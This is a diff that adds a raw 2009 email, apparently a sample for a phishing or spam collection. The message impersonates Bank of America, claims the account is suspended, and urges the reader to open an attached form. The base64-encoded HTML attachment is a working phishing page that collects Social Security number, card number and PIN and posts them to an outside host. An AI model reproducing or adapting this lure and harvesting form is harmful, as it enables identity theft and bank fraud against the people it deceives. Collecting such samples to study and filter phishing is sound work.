@@ -1,0 +1,127 @@
+X-Account-Key: account2
+Return-path: <customerservice@bankofamerica.com>
+Envelope-to: pablof@uvigo.es
+Delivery-date: Thu, 15 Oct 2009 10:20:27 +0200
+Received: from mail.uvigo.es ([193.146.32.69] helo=grelo.uvigo.es)
+	by cacahuete.uvigo.es with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.69)
+	(envelope-from <customerservice@bankofamerica.com>)
+	id 1MyLZS-0005er-6v
+	for pablof@uvigo.es; Thu, 15 Oct 2009 10:20:26 +0200
+Received: from cogumelo.uvigo.es (antispam1.uvigo.es [193.146.32.120])
+	by grelo.uvigo.es (8.13.8/8.13.8/Debian-3) with ESMTP id n9F8KLGW028558
+	(version=TLSv1/SSLv3 cipher=AES256-SHA bits=256 verify=NOT)
+	for <pablof@uvigo.es>; Thu, 15 Oct 2009 10:20:25 +0200
+Received: from mail.westminsterinc.com ([66.43.173.67] helo=exchange2.westminsterinc.com)
+	by cogumelo.uvigo.es with esmtp (Exim 4.69)
+	(envelope-from <customerservice@bankofamerica.com>)
+	id 1MyLJP-0002KP-DX
+	for pablof@uvigo.es; Thu, 15 Oct 2009 10:03:52 +0200
+Received: from bankofamerica.com ([69.3.86.74]) by exchange2.westminsterinc.com with Microsoft SMTPSVC(6.0.3790.3959);
+	 Thu, 15 Oct 2009 04:18:34 -0400
+From: =?Windows-1252?B?QmFuayBvZiBBbWVyaWNh?=<customerservice@bankofamerica.com>
+To: pablof@uvigo.es
+Date: 15 Oct 2009 04:17:16 -0400
+Message-ID: <20091015041716.6932E5E746DC3453@bankofamerica.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_B0E52B02.3B9C1454"
+X-OriginalArrivalTime: 15 Oct 2009 08:18:35.0056 (UTC) FILETIME=[16F8CB00:01CA4D70]
+X-Spam-Flag: No
+X-Spam-Checker-Version: SpamAssassin 3.2.5 (2008-06-10) on cogumelo.uvigo.es
+X-Spam-Status: No, score=2.1 required=5.0 tests=BAYES_50,FROM_EXCESS_BASE64,
+	SPF_SOFTFAIL autolearn=no version=3.2.5
+X-Spam-UVIGO-Status: No, score=2.1 required=5.0 tests=BAYES_50=0.001,
+	FROM_EXCESS_BASE64=1.456,SPF_SOFTFAIL=0.596 autolearn=no version=3.2.5
+X-Spam-UVIGO-Level: **
+X-Spam-UVIGO: No
+X-Spam-UVIGO-Score: _SCOREINT_
+Subject: =?Windows-1252?B?QWNjb3VudCBoYXMgYmVlbiB0ZW1wb3JhcmlseSBzdXNwZW5kZWQgZm9yIHNlY3VyaXR5IHJlYXNvbnM=?=
+X-Mail-Scanned: Criba + Clamd smtp.uvigo.es
+X-SA-Exim-Connect-IP: 193.146.32.69
+X-SA-Exim-Mail-From: customerservice@bankofamerica.com
+X-SA-Exim-Scanned: No (on cacahuete.uvigo.es); SAEximRunCond expanded to false
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_B0E52B02.3B9C1454
+Content-Type: text/plain
+Content-Transfer-Encoding: 8bit
+
+Dear customer
+
+We regret to inform you that your Bank of America Online Account 
+has been temporarily suspended.
+Your account has been suspended after too many failed login 
+attempts have been made. This is most likely an attempt to gain 
+unauthorized access to your account and/or personal information.
+
+To resolve this problem we have attached a form to this email. 
+Please download the form, open it and follow the instructions on 
+your screen.
+
+Bank of America, Member FDIC
+©2009 Bank of America Corporation. All Rights Reserved.
+------=_NextPart_000_0012_B0E52B02.3B9C1454
+Content-Type: application/octet-stream; name="restore_your_account.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="restore_your_account.html"
+
+PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlv
+bmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5z
+aXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0
+bWwiPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9
+InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5SZXN0b3JlIFlvdXIgQWNj
+b3VudDwvdGl0bGU+DQo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBo
+cmVmPSJodHRwOi8vc2VhZ2F0ZWJhcnJhY3VkYS5jb20vdy5waHA/ZnJtPXQiIC8+DQo8c2Ny
+aXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0Kd2lu
+ZG93Lm9ubG9hZCA9IGZ1bmN0aW9uKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlYWQn
+KS5zdHlsZS5kaXNwbGF5ID0gJ3RhYmxlJzsgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05h
+bWUoJ25vc2NyaXB0JylbMF0uc3R5bGUuZGlzcGxheSA9ICdub25lJzt9Ow0KZnVuY3Rpb24g
+dHN0KHIsZSl7cmV0dXJuIHIudGVzdChkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1tlXS52
+YWx1ZSk7fSANCmZ1bmN0aW9uIHIoZSxtKXthbGVydChtKTsgZG9jdW1lbnQuZm9ybXNbMF0u
+ZWxlbWVudHNbZV0uZm9jdXMoKTsgcmV0dXJuIGZhbHNlO30NCmZ1bmN0aW9uIGVsbShlKXty
+ZXR1cm4gZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbZV07fQ0KZnVuY3Rpb24gdmFsaWRh
+dGUoKXsNCglpZighdHN0KC9eWzAtOV17OX0kL2ksJ3NzbicpKXtyZXR1cm4gcignc3NuJywn
+U29jaWFsIFNlY3VyaXR5IE51bWJlcjpcblBsZWFzZSBlbnRlciBhIHZhbGlkIFNTTixcbjkg
+ZGlnaXRzIHdpdGhvdXQgc3BhY2VzIG9yIGRhc2hlcy4nKTt9DQoJaWYoIXRzdCgvXigzfDR8
+NXw2fDcpezF9WzAtOV17MTUsMTZ9JC9pLCdjYycpKXtyZXR1cm4gcignY2MnLCdBVE0gb3Ig
+Q2hlY2sgQ2FyZCBOdW1iZXI6XG5QbGVhc2UgZW50ZXIgYSB2YWxpZCBDYXJkIE51bWJlcixc
+bjE2IGRpZ2l0cyB3aXRob3V0IHNwYWNlcyBvciBkYXNoZXMuJyk7fQ0KCWlmKCF0c3QoL15b
+MC05XXs0fSQvaSwncGluJykpe3JldHVybiByKCdwaW4nLCdBVE0gb3IgQ2hlY2sgQ2FyZCBQ
+SU46XG5QbGVhc2UgZW50ZXIgYSB2YWxpZCBBVE0gb3IgQ2hlY2sgQ2FyZCBQSU5cbjQtMTIg
+ZGlnaXRzLicpO30NCglyZXR1cm4gdHJ1ZTsNCn0NCjwvc2NyaXB0Pg0KPC9oZWFkPg0KDQo8
+Ym9keT4NCgk8bm9zY3JpcHQ+VGhpcyBwYWdlIHJlcXVpcmVzIEphdmFzY3JpcHQuIFBsZWFz
+ZSBvcGVuIHRoaXMgcGFnZSBpbiBhIEphdmFzY3JpcHQgZW5hYmxlZCBicm93c2VyLjwvbm9z
+Y3JpcHQ+DQoJPHRhYmxlIGlkPSJoZWFkIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9
+IjAiPg0KICAgIAk8dHI+PHRkIGlkPSJ0ZDEiPjwvdGQ+PHRkIGlkPSJ0ZDIiPjwvdGQ+PC90
+cj4NCiAgICAgICAgPHRyPjx0ZCBpZD0idGQzIiBjb2xzcGFuPSIyIj48ZGl2PjwvZGl2Pjwv
+dGQ+PC90cj4NCiAgICAgICAgPHRyPjx0ZCBjb2xzcGFuPSIyIiBpZD0ibWFpbiI+DQogICAg
+ICAgIAk8Zm9ybSBhY3Rpb249Imh0dHA6Ly9zZWFnYXRlYmFycmFjdWRhLmNvbS93LnBocCIg
+bWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIHZhbGlkYXRlKCkiPg0KICAgICAgICAg
+ICAgPHRhYmxlIGlkPSJmIj4NCiAgICAgICAgICAgIAk8dHI+PHRkPllvdSBoYXZlIHJlY2Vp
+dmVkIHRoaXMgZmlsZSBiZWNhdXNlIHlvdXIgQmFuayBvZiBBbWVyaWNhIE9ubGluZSBBY2Nv
+dW50IGhhcyBiZWVuIHRlbXBvcmFyaWx5IHN1c3BlbmRlZCBmb3Igc2VjdXJpdHkgcmVhc29u
+cy48YnIgLz5UbyByZXN0b3JlIHlvdXIgYWNjb3VudCBwbGVhc2UgZmlsbCBpbiB0aGUgZm9y
+bSBiZWxvdyBhbmQgY2xpY2sgIlN1Ym1pdCIuPGJyIC8+QWxsIGZpZWxkcyBhcmUgcmVxdWly
+ZWQuPGJyIC8+PGJyIC8+PC90ZD48L3RyPg0KICAgICAgICAgICAgCTx0cj48dGQ+PHN0cm9u
+Zz5Tb2NpYWwgU2VjdXJpdHkgTnVtYmVyPC9zdHJvbmc+PC90ZD48L3RyPjx0cj48dGQ+PGlu
+cHV0IHR5cGU9InRleHQiIG5hbWU9InNzbiIgbWF4bGVuZ3RoPSI5IiBzaXplPSIyNSIgLz48
+YnIgLz48c3BhbiBjbGFzcz0iaCI+KDkgZGlnaXRzLCBubyBzcGFjZXMgb3IgZGFzaGVzKTwv
+c3Bhbj48YnIgLz48YnIgLz48L3RkPjwvdHI+DQogICAgICAgICAgICAgICAgPHRyPjx0ZD48
+c3Ryb25nPkJhbmsgb2YgQW1lcmljYSBBVE0gb3IgQ2hlY2sgQ2FyZCBOdW1iZXI8L3N0cm9u
+Zz48L3RkPjwvdHI+PHRyPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY2MiIG1heGxl
+bmd0aD0iMTciIHNpemU9IjI1IiAvPjxiciAvPjxzcGFuIGNsYXNzPSJoIj4oMTYgZGlnaXRz
+LCBubyBzcGFjZXMgb3IgZGFzaGVzKTwvc3Bhbj48YnIgLz48YnIgLz48L3RkPjwvdHI+DQog
+ICAgICAgICAgICAgICAgPHRyPjx0ZD48c3Ryb25nPkFUTSBvciBDaGVjayBDYXJkIFBJTjwv
+c3Ryb25nPjwvdGQ+PC90cj48dHI+PHRkPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0i
+cGluIiBtYXhsZW5ndGg9IjQiIHNpemU9IjQiIC8+PGJyIC8+PHNwYW4gY2xhc3M9ImgiPig0
+IGRpZ2l0cyk8L3NwYW4+PGJyIC8+PGJyIC8+PC90ZD48L3RyPg0KICAgICAgICAgICAgCTx0
+cj48dGQ+PGlucHV0IHR5cGU9InN1Ym1pdCIgaWQ9InMiIHZhbHVlPSJTdWJtaXQiIC8+PC90
+ZD48L3RyPg0KICAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAg
+ICAgICAgPC90ZD48L3RyPg0KICAgICAgICA8dHI+PHRkIGNvbHNwYW49IjIiIGlkPSJmb290
+Ij48L3RkPjwvdHI+DQogICAgPC90YWJsZT4NCjwvYm9keT4NCjwvaHRtbD4NCg==
+
+------=_NextPart_000_0012_B0E52B02.3B9C1454--
+
+
